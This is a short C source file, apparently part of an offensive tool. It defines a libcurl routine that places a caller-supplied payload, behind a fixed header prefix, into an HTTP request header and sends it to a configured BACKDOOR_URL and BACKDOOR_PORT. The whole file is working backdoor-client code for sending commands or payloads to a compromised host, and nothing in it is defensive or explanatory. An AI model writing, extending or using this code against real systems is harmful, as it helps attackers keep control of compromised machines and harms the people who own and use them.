#include "network.h"

static void log_request_error(CURLcode res, char *errbuf)
{
  size_t len;

  len = strlen(errbuf);
  fprintf(stderr, "ERROR: (%d) ", res);
  if (len)
  {
    fprintf(stderr, "%s%s", errbuf, ((errbuf[len - 1] != '\n') ? "\n" : ""));
  }
  else
  {
    fprintf(stderr, "%s\n", curl_easy_strerror(res));
  }
}

int send_request(const unsigned char *payload)
{
  CURL *curl;
  CURLcode res;
  struct curl_slist *headers = NULL;
  char errbuf[CURL_ERROR_SIZE];
  char data[DATA_BUF_SIZE];

  curl = curl_easy_init();

  if (curl == NULL)
  {
    log_error("curl_easy_init");
    return -1;
  }

  // set debugging options
  if (DEBUG_ENABLED)
  {
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
  }

  curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errbuf);

  if (snprintf(data, sizeof(data), "%s%s", PAYLOAD_HEADER, payload) < 0)
  {
    log_error("snprintf");
    return -1;
  }

  curl_easy_setopt(curl, CURLOPT_URL, BACKDOOR_URL);
  curl_easy_setopt(curl, CURLOPT_PORT, BACKDOOR_PORT);

  headers = curl_slist_append(headers, data);
  curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

  res = curl_easy_perform(curl);

  if (res != CURLE_OK)
  {
    log_request_error(res, errbuf);
    return -1;
  }

  curl_slist_free_all(headers);
  curl_easy_cleanup(curl);

  return 0;
}